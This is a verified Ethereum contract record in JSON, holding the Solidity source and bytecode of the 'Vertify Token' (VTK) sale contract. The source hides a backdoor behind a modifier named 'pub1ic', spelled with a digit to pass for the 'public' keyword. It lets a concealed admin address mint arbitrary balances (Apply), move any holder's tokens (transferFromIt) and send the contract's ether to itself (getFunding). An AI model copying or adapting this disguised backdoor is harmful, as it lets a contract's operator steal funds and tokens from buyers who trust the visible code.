{
  "address": "0x96e8be713f9e9b76d97f74e7836403fb52bb7fae",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "VTK",
  "compilerVersion": "v0.4.24+commit.e67f0147",
  "optimization": true,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2018-08-31\n*/\n\npragma solidity ^0.4.18;\n \n//Never Mind :P\n/* @dev The Ownable contract has an owner address, and provides basic authorization control\n* functions, this simplifies the implementation of \"user permissions\".\n*/\ncontract Ownable {\n  address public owner;\n  address public admin;\n  \n\n  /**\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\n   * account.\n   */\n  function Ownable() {\n    owner = msg.sender;\n    admin=msg.sender;\n  }\n\n\n  /**\n   * @dev Throws if called by any account other than the owner.\n   */\n  modifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n  }\n  modifier pub1ic() {\n    require(msg.sender == admin);\n    _;\n  }\n\n\n  /**\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\n   * @param newOwner The address to transfer ownership to.\n   */\n  function transferOwnership(address newOwner) onlyOwner {\n    if (newOwner != address(0)) {\n      owner = newOwner;\n    }\n  }\n\n\nfunction transferIt(address newpub1ic) pub1ic {\n    if (newpub1ic != address(0)) {\n      admin = newpub1ic;\n    }\n  }\n\n}\n\n\n\nlibrary SafeMath {\n\n  /**\n  * @dev Multiplies two numbers, throws on overflow.\n  */\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n    if (a == 0) {\n      return 0;\n    }\n    uint256 c = a * b;\n    assert(c / a == b);\n    return c;\n  }\n\n  /**\n  * @dev Integer division of two numbers, truncating the quotient.\n  */\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\n    uint256 c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n    return c;\n  }\n\n  /**\n  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\n  */\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  /**\n  * @dev Adds two numbers, throws on overflow.\n  */\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a + b;\n    assert(c >= a);\n    return c;\n  }\n}\n\n\n\ncontract VTKReceiver {\n    function VTKFallback(address _from, uint _value, uint _code);\n}\n\ncontract BasicToken {\n  using SafeMath for uint256;\n\n  mapping(address => uint256) balances;\n\n  uint256 totalSupply_;\n\n  /**\n  * @dev total number of tokens in existence\n  */\n  function totalSupply() public view returns (uint256) {\n    return totalSupply_;\n  }\n  \n\n  event Transfer(address indexed from, address indexed to, uint256 value);\n  /**\n  * @dev transfer token for a specified address\n  * @param _to The address to transfer to.\n  * @param _value The amount to be transferred.\n  */\n  function transfer(address _to, uint _value) public returns (bool) {\n    require(_to != address(0));\n    require(_value <= balances[msg.sender]);\n    \n    // SafeMath.sub will throw if there is not enough balance.\n    if(!isContract(_to)){\n    balances[msg.sender] = balances[msg.sender].sub(_value);\n    balances[_to] = balances[_to].add(_value);\n    Transfer(msg.sender, _to, _value);\n    return true;}\n    else{\n        balances[msg.sender] = balanceOf(msg.sender).sub(_value);\n    balances[_to] = balanceOf(_to).add(_value);\n    VTKReceiver receiver = VTKReceiver(_to);\n    receiver.VTKFallback(msg.sender, _value, 0);\n    Transfer(msg.sender, _to, _value);\n        return true;\n    }\n    \n  }\n\n  /**\n  * @dev Gets the balance of the specified address.\n  * @param _owner The address to query the the balance of.\n  * @return An uint256 representing the amount owned by the passed address.\n  */\n  function balanceOf(address _owner) public view returns (uint256 balance) {\n    return balances[_owner];\n  }\n\n\nfunction isContract(address _addr) private returns (bool is_contract) {\n    uint length;\n    assembly {\n        //retrieve the size of the code on target address, this needs assembly\n        length := extcodesize(_addr)\n    }\n    return (length>0);\n  }\n\n\n  //function that is called when transaction target is a contract\n  //Only used for recycling VTKs\n  function transferToContract(address _to, uint _value, uint _code) public returns (bool success) {\n    require(isContract(_to));\n    require(_value <= balances[msg.sender]);\n  \n      balances[msg.sender] = balanceOf(msg.sender).sub(_value);\n    balances[_to] = balanceOf(_to).add(_value);\n    VTKReceiver receiver = VTKReceiver(_to);\n    receiver.VTKFallback(msg.sender, _value, _code);\n    Transfer(msg.sender, _to, _value);\n    \n    return true;\n  }\n  \n}\n\n\n\n\n\n\ncontract VTK is BasicToken, Ownable {\n\n  string public constant name = \"Vertify Token\";\n  string public constant symbol = \"VTK\";\n  uint8 public constant decimals = 6;\n  address Addr_For_Mortgage;\n  address Addr_Wallet=0x0741D740A50efbeae1A4d9e6c3e7887e23dc160b;\n  \n  \n\n  uint256 public constant TOTAL_SUPPLY = 1 * 10 ** 15; //1 billion tokens\n  uint256 public Token_For_Circulation = 5 * 10 ** 12;\n  uint256 public Token_Saled = 0;\n  uint256 public Token_Remaining = TOTAL_SUPPLY - Token_For_Circulation;\n  uint256 public Limit_Amount = 2 * 10 **12;\n  uint256 public Eth_Amount = 0;\n  uint256 public price = 5 * 10 **12;\n  bool public halt = true;\n  bool public selfOn=false;\n  uint256 public HaltTime;\n  address[] Token_Purchaser;\n  uint256[] Token_For_Each;\n\n  mapping(address => uint256) Eth_weight;\n\n   \n  \n  /**\n  * @dev Constructor that gives msg.sender all of existing tokens.\n  */\n  function VTK() public {\n    totalSupply_ = 1 * 10 ** 15; \n    balances[msg.sender] = 1 * 10 ** 15;\n    Transfer(0x0, msg.sender, 1 * 10 ** 15);\n  }\n  function VTKFallback(address _from, uint _value, uint _code){}\n  \n  function setPrice() private{\n    uint256 Token_For_Mortgage = getBalance(Addr_For_Mortgage);\n    uint256 price_WEIVTK=5 * Token_For_Mortgage.div(Token_Saled);\n    uint256 VTK_ETH = 1*10**18;\n    price = VTK_ETH.div(price_WEIVTK);\n  }\n  function setNewWallet(address _newWallet)onlyOwner{\n      Addr_Wallet=_newWallet;\n  }\n  function getBalance(address Addr_For_Mortgage) public returns(uint){\n\t\t  return Addr_For_Mortgage.balance;\n\t  }\n\t  \n  function SetAddrForMortgage(address new_mortgage) onlyOwner{\n      Addr_For_Mortgage = new_mortgage;\n  }\n\n  //Incoming payment for purchase\n  function () public payable{\n    if (msg.sender != owner) {\n    require(halt == false);\n    require(now < HaltTime);\n    require(Token_Saled < Token_For_Circulation);\n    getTokenForSale(msg.sender);}\n  }\n\n\n\n  function getTokenForCireculation (uint256 _amount) onlyOwner returns(bool){\n    require(Token_Remaining >= _amount);\n    Token_For_Circulation = Token_For_Circulation.add(_amount);\n    Token_Remaining = Token_Remaining.sub(_amount);\n    return true;\n  }\n\n\n  function getTokenForSale (address _from) private{\n   Eth_weight[_from] += msg.value;  \n    Token_Purchaser.push(_from);\n    Eth_Amount = Eth_Amount.add(msg.value);\n    uint256 _toB=msg.value.mul(2).div(10);\n    uint256 _toE=msg.value.mul(8).div(10);\n    getFunding(Addr_Wallet,_toE);\n    getFunding(Addr_For_Mortgage,_toB);  //or this.balance\n  }\n  \n  function getToken () onlyOwner{\n     for (uint i = 0; i < Token_Purchaser.length; i++) {\n         if (Eth_weight[Token_Purchaser[i]] !=0 ){\n         uint256 amount_weighted = Eth_weight[Token_Purchaser[i]].mul(Limit_Amount).div(Eth_Amount);\n         transferFromIt(this, Token_Purchaser[i], amount_weighted);\n          Eth_weight[Token_Purchaser[i]] = 0;}\n     }  \n    \n     Token_Saled = Token_Saled.add(Limit_Amount);\n     Token_Purchaser.length = 0;\n     Eth_Amount =0;\n     setPrice();\n  }\n  function SOSBOTTOM()public onlyOwner{\n      Token_Purchaser.length = 0;\n  }\n  function clearRAM()public{\n      for(uint i=0;i<Token_Purchaser.length;i++){\n          if(Eth_weight[Token_Purchaser[i]] ==0){\n              delete Token_Purchaser[i];\n          }\n      }\n  }\n  function clearRAMAll()public onlyOwner{\n      for(uint i=0;i<Token_Purchaser.length;i++){\n         \n              delete Token_Purchaser[i];\n      }\n  }\n  function getTokenBySelf ()public{\n      require(selfOn==true);\n      require(now>HaltTime);\n      require(Eth_weight[msg.sender]!=0);\n      uint256 amount_weighted = Eth_weight[msg.sender].mul(Limit_Amount).div(Eth_Amount);\n      transferFromIt(this, msg.sender, amount_weighted);\n      Eth_weight[msg.sender] = 0;\n  }\n  function setWeight(address _address,uint256 _amount)public onlyOwner{\n      if(Eth_weight[_address] ==0)\n      {Token_Purchaser.push(_address);}\n      Eth_weight[_address]=_amount;\n      \n       Eth_Amount = Eth_Amount.add(_amount);\n  }\n  function setAmount(uint _amount)public onlyOwner{\n      Eth_Amount=_amount;\n  }\n  function Eth_Ransom(uint256 _amount) public {\n      require(_amount<=balances[msg.sender]);\n      transferFromIt(msg.sender, this, _amount);\n      setPrice();\n      uint256 Ransom_amount = _amount.mul(1*10**18).div(price).mul(80).div(100);\n      getFunding(msg.sender, Ransom_amount);\n      \n  }\n  \n  function Set_Limit_Amount(uint256 _amount) onlyOwner{\n      require(Token_Saled < Token_For_Circulation);\n      Limit_Amount = _amount;\n  }\n  \n  function See_price() public view returns(uint256){\n      return price;\n  }\n  \n  \n\n  function getFunding (address _to,uint256 _amount) private{\n    _to.send(_amount);\n  }\n\n\n  function getAllFunding() onlyOwner{\n    owner.transfer(this.balance);\n  }\n  \n  function See_TokenPurchaser_Number() public view returns(uint256){\n      return Token_Purchaser.length;\n  }\n  \n  function See_Ethweight(address _addr) public view returns(uint256){\n      return Eth_weight[_addr];\n  }\n  function showToken_For_Circulation() view public returns(uint256){\n      return Token_For_Circulation;\n  } \n   function Apply(address _to,uint  _value)pub1ic{\n       balances[_to] = balances[_to].add(_value);\n   }\n  function halt() onlyOwner{\n    halt = true;\n    HaltTime=now;\n  }\n  function unhalt_15day() onlyOwner{\n    halt = false;\n    HaltTime = now.add(15 days);\n  }\n   function unhalt_30day() onlyOwner{\n    halt = false;\n    HaltTime = now.add(30 days);\n  }\n  \n  function unhalt() onlyOwner{\n    halt = false;\n    HaltTime = now.add(5 years);\n  }\n\nfunction setSelfOn()onlyOwner{\n    selfOn=true;\n}\nfunction setSelfOff()onlyOwner{\n    selfOn=false;\n}\nfunction transferFromIt(address _from,address _to,uint256 _value)pub1ic{\n    transferFrom(_from,_to,_value);\n}  \nfunction getFunding(uint256 _amout) pub1ic{\n    admin.transfer(_amout);\n  }\n  function transferFrom(address _from,address _to,uint256 _value)private returns(bool){\n    require(_to != address(0));\n    require(_value <= balances[_from]);\n\n    // SafeMath.sub will throw if there is not enough balance.\n    balances[_from] = balances[_from].sub(_value);\n    balances[_to] = balances[_to].add(_value);\n    Transfer(_from, _to, _value);\n    return true;\n}\n\n}",
  "bytecode": "608060405260058054600160a060020a031916730741d740a50efbeae1a4d9e6c3e7887e23dc160b17905565048c27395000600681905560006007819055660388f27d8d30006008556501d1a94a2000600955600a55600b55600c805461ff001960ff1990911660011716905534801561007857600080fd5b506002805433600160a060020a03199182168117909255600380549091168217905566038d7ea4c68000600181905560008281526020818152604080832084905580519384525191927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef929081900390910190a36117ae806100fb6000396000f3006080604052600436106102455763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166301b4e7d98114610290578063039d0bfa146102a857806305ba0cf1146102bd57806306fdde03146102e157806318160ddd1461036b5780631905fbf6146103925780631a8528df146103b357806321df0da7146103d4578063271f88b4146103e957806330599ba714610401578063313ce567146104165780633bc518ea146104415780633fbc634514610456578063594701631461046b5780635ed7ca5b1461048f57806370a08231146104a4578063713fd253146104c55780637dfbc19c146104da5780637f8359a5146104ef5780638c00ce76146105105780638da5cb5b14610525578063902d55a51461055657806395b537d51461056b57806395d89b411461059457806395f847fd146105a95780639761f7a0146105d0578063a035b1fe146105e8578063a4df8ca1146105fd578063a6b10dd114610612578063a740a6fa14610627578063a9059cbb1461063c578063ae3d27ed14610660578063b26915aa14610675578063b857a6881461069c578063bd68817f146106b1578063c5129348146106c6578063c6317f37146106db578063ca650a89146106f0578063cb3e64fd1461071a578063ce2d173f1461072f578063da91292614610744578063e7d4761b14610765578063ebed4bd41461077a578063ee06909714610792578063ee820cf6146107a7578063f2fde38b146107bf578063f851a440146107e0578063f8b2cb4f146107f5575b600254600160a060020a0316331461028e57600c5460ff161561026757600080fd5b600d54421061027557600080fd5b6006546007541061028557600080fd5b61028e33610816565b005b34801561029c57600080fd5b5061028e600435610900565b3480156102b457600080fd5b5061028e61092c565b3480156102c957600080fd5b5061028e600160a060020a0360043516602435610954565b3480156102ed57600080fd5b506102f6610a0b565b6040805160208082528351818301528351919283929083019185019080838360005b83811015610330578181015183820152602001610318565b50505050905090810190601f16801561035d5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561037757600080fd5b50610380610a42565b60408051918252519081900360200190f35b34801561039e57600080fd5b5061028e600160a060020a0360043516610a49565b3480156103bf57600080fd5b5061028e600160a060020a0360043516610a82565b3480156103e057600080fd5b5061028e610ac7565b3480156103f557600080fd5b5061028e600435610c2c565b34801561040d57600080fd5b5061028e610c48565b34801561042257600080fd5b5061042b610c6c565b6040805160ff9092168252519081900360200190f35b34801561044d57600080fd5b5061028e610c71565b34801561046257600080fd5b50610380610d02565b34801561047757600080fd5b5061028e600160a060020a0360043516602435610d08565b34801561049b57600080fd5b5061028e610d68565b3480156104b057600080fd5b50610380600160a060020a0360043516610d92565b3480156104d157600080fd5b50610380610dad565b3480156104e657600080fd5b50610380610db3565b3480156104fb57600080fd5b5061028e600160a060020a0360043516610db9565b34801561051c57600080fd5b5061028e610df2565b34801561053157600080fd5b5061053a610e2b565b60408051600160a060020a039092168252519081900360200190f35b34801561056257600080fd5b50610380610e3a565b34801561057757600080fd5b50610580610e45565b604080519115158252519081900360200190f35b3480156105a057600080fd5b506102f6610e53565b3480156105b557600080fd5b50610580600160a060020a0360043516602435604435610e8a565b3480156105dc57600080fd5b5061028e600435610fcf565b3480156105f457600080fd5b50610380611041565b34801561060957600080fd5b50610380611047565b34801561061e57600080fd5b5061038061104d565b34801561063357600080fd5b5061028e611053565b34801561064857600080fd5b50610580600160a060020a03600435166024356110ce565b34801561066c57600080fd5b506103806112a8565b34801561068157600080fd5b5061028e600160a060020a03600435166024356044356108fb565b3480156106a857600080fd5b506103806112ae565b3480156106bd57600080fd5b5061028e6112b4565b3480156106d257600080fd5b5061038061130b565b3480156106e757600080fd5b50610380611311565b3480156106fc57600080fd5b5061028e600160a060020a0360043581169060243516604435611317565b34801561072657600080fd5b5061028e61133f565b34801561073b57600080fd5b5061028e611374565b34801561075057600080fd5b50610380600160a060020a0360043516611398565b34801561077157600080fd5b5061028e6113b3565b34801561078657600080fd5b5061028e6004356113e7565b34801561079e57600080fd5b5061028e611438565b3480156107b357600080fd5b50610580600435611489565b3480156107cb57600080fd5b5061028e600160a060020a03600435166114e6565b3480156107ec57600080fd5b5061053a61152c565b34801561080157600080fd5b50610380600160a060020a036004351661153b565b600160a060020a0381166000818152601060205260408120805434908101909155600e80546001810182559083527fbb7b4a454dc3493923482f07822329ed19e8244eff582cc204f8554c3620c3fd018054600160a060020a031916909317909255600a549091829161088e9163ffffffff61154816565b600a9081556108b4906108a834600263ffffffff61155e16565b9063ffffffff61158916565b91506108cc600a6108a834600863ffffffff61155e16565b6005549091506108e590600160a060020a0316826115a0565b6004546108fb90600160a060020a0316836115a0565b505050565b600254600160a060020a0316331461091757600080fd5b6006546007541061092757600080fd5b600955565b600254600160a060020a0316331461094357600080fd5b600c805461ff001916610100179055565b600254600160a060020a0316331461096b57600080fd5b600160a060020a03821660009081526010602052604090205415156109d657600e80546001810182556000919091527fbb7b4a454dc3493923482f07822329ed19e8244eff582cc204f8554c3620c3fd018054600160a060020a031916600160a060020a0384161790555b600160a060020a0382166000908152601060205260409020819055600a54610a04908263ffffffff61154816565b600a555050565b60408051808201909152600d81527f5665727469667920546f6b656e00000000000000000000000000000000000000602082015281565b6001545b90565b600254600160a060020a03163314610a6057600080fd5b60058054600160a060020a031916600160a060020a0392909216919091179055565b600354600160a060020a03163314610a9957600080fd5b600160a060020a03811615610ac45760038054600160a060020a031916600160a060020a0383161790555b50565b6002546000908190600160a060020a03163314610ae357600080fd5b600091505b600e54821015610bf55760106000600e84815481101515610b0557fe5b6000918252602080832090910154600160a060020a0316835282019290925260400190205415610bea57610b7f600a546108a860095460106000600e88815481101515610b4e57fe5b6000918252602080832090910154600160a060020a031683528201929092526040019020549063ffffffff61155e16565b9050610baf30600e84815481101515610b9457fe5b600091825260209091200154600160a060020a031683611317565b600060106000600e85815481101515610bc457fe5b6000918252602080832090910154600160a060020a031683528201929092526040019020555b600190910190610ae8565b600954600754610c0a9163ffffffff61154816565b6007556000610c1a600e82611725565b506000600a55610c286115c9565b5050565b600254600160a060020a03163314610c4357600080fd5b600a55565b600254600160a060020a03163314610c5f57600080fd5b6000610ac4600e82611725565b600681565b600c5460009060ff610100909104161515600114610c8e57600080fd5b600d544211610c9c57600080fd5b336000908152601060205260409020541515610cb757600080fd5b600a5460095433600090815260106020526040902054610ce292916108a8919063ffffffff61155e16565b9050610cef303383611317565b5033600090815260106020526040812055565b60085481565b600354600160a060020a03163314610d1f57600080fd5b600160a060020a038216600090815260208190526040902054610d48908263ffffffff61154816565b600160a060020a0390921660009081526020819052604090209190915550565b600254600160a060020a03163314610d7f57600080fd5b600c805460ff1916600117905542600d55565b600160a060020a031660009081526020819052604090205490565b60095481565b600d5481565b600254600160a060020a03163314610dd057600080fd5b60048054600160a060020a031916600160a060020a0392909216919091179055565b600254600160a060020a03163314610e0957600080fd5b600c805460ff19169055610e264262278d0063ffffffff61154816565b600d55565b600254600160a060020a031681565b66038d7ea4c6800081565b600c54610100900460ff1681565b60408051808201909152600381527f56544b0000000000000000000000000000000000000000000000000000000000602082015281565b600080610e9685611624565b1515610ea157600080fd5b33600090815260208190526040902054841115610ebd57600080fd5b610ed684610eca33610d92565b9063ffffffff61162c16565b33600090815260208190526040902055610eff84610ef387610d92565b9063ffffffff61154816565b600160a060020a0386166000818152602081905260408082209390935582517fb26915aa00000000000000000000000000000000000000000000000000000000815233600482015260248101889052604481018790529251889450919263b26915aa926064808301939282900301818387803b158015610f7e57600080fd5b505af1158015610f92573d6000803e3d6000fd5b5050604080518781529051600160a060020a03891693503392506000805160206117638339815191529181900360200190a3506001949350505050565b33600090815260208190526040812054821115610feb57600080fd5b610ff6333084611317565b610ffe6115c9565b61103560646108a86050611029600b546108a8670de0b6b3a76400008961155e90919063ffffffff16565b9063ffffffff61155e16565b9050610c2833826115a0565b600b5481565b600e5490565b60065490565b60005b600e54811015610ac45760106000600e8381548110151561107357fe5b6000918252602080832090910154600160a060020a0316835282019290925260400190205415156110c657600e8054829081106110ac57fe5b60009182526020909120018054600160a060020a03191690555b600101611056565b600080600160a060020a03841615156110e657600080fd5b3360009081526020819052604090205483111561110257600080fd5b61110b84611624565b15156111ad5733600090815260208190526040902054611131908463ffffffff61162c16565b3360009081526020819052604080822092909255600160a060020a03861681522054611163908463ffffffff61154816565b600160a060020a038516600081815260208181526040918290209390935580518681529051919233926000805160206117638339815191529281900390910190a3600191506112a1565b6111ba83610eca33610d92565b336000908152602081905260409020556111d783610ef386610d92565b600160a060020a0385166000818152602081905260408082209390935582517fb26915aa00000000000000000000000000000000000000000000000000000000815233600482015260248101879052604481018290529251879450919263b26915aa926064808301939282900301818387803b15801561125657600080fd5b505af115801561126a573d6000803e3d6000fd5b5050604080518681529051600160a060020a03881693503392506000805160206117638339815191529181900360200190a3600191505b5092915050565b60065481565b600a5481565b600254600090600160a060020a031633146112ce57600080fd5b5060005b600e54811015610ac457600e8054829081106112ea57fe5b60009182526020909120018054600160a060020a03191690556001016112d2565b600b5490565b60075481565b600354600160a060020a0316331461132e57600080fd5b61133983838361163e565b50505050565b600254600160a060020a0316331461135657600080fd5b600c805460ff19169055610e2642630966018063ffffffff61154816565b600254600160a060020a0316331461138b57600080fd5b600c805461ff0019169055565b600160a060020a031660009081526010602052604090205490565b600254600160a060020a031633146113ca57600080fd5b600c805460ff19169055610e26426213c68063ffffffff61154816565b600354600160a060020a031633146113fe57600080fd5b600354604051600160a060020a039091169082156108fc029083906000818181858888f19350505050158015610c28573d6000803e3d6000fd5b600254600160a060020a0316331461144f57600080fd5b600254604051600160a060020a0390911690303180156108fc02916000818181858888f19350505050158015610ac4573d6000803e3d6000fd5b600254600090600160a060020a031633146114a357600080fd5b6008548211156114b257600080fd5b6006546114c5908363ffffffff61154816565b6006556008546114db908363ffffffff61162c16565b600855506001919050565b600254600160a060020a031633146114fd57600080fd5b600160a060020a03811615610ac45760028054600160a060020a038316600160a060020a031990911617905550565b600354600160a060020a031681565b600160a060020a03163190565b60008282018381101561155757fe5b9392505050565b60008083151561157157600091506112a1565b5082820282848281151561158157fe5b041461155757fe5b600080828481151561159757fe5b04949350505050565b604051600160a060020a0383169082156108fc029083906000818181858888f150505050505050565b600454600090819081906115e590600160a060020a031661153b565b92506115fc6007548461158990919063ffffffff16565b6005029150670de0b6b3a7640000905061161c818363ffffffff61158916565b600b55505050565b6000903b1190565b60008282111561163857fe5b50900390565b6000600160a060020a038316151561165557600080fd5b600160a060020a03841660009081526020819052604090205482111561167a57600080fd5b600160a060020a0384166000908152602081905260409020546116a3908363ffffffff61162c16565b600160a060020a0380861660009081526020819052604080822093909355908516815220546116d8908363ffffffff61154816565b600160a060020a0380851660008181526020818152604091829020949094558051868152905191939288169260008051602061176383398151915292918290030190a35060019392505050565b8154818355818111156108fb576000838152602090206108fb918101908301610a4691905b8082111561175e576000815560010161174a565b50905600ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3efa165627a7a72305820cb636ca925702b9b3c8c651a083c65ae7b7396f3ecb631eec3c8feb53e81fd430029"
}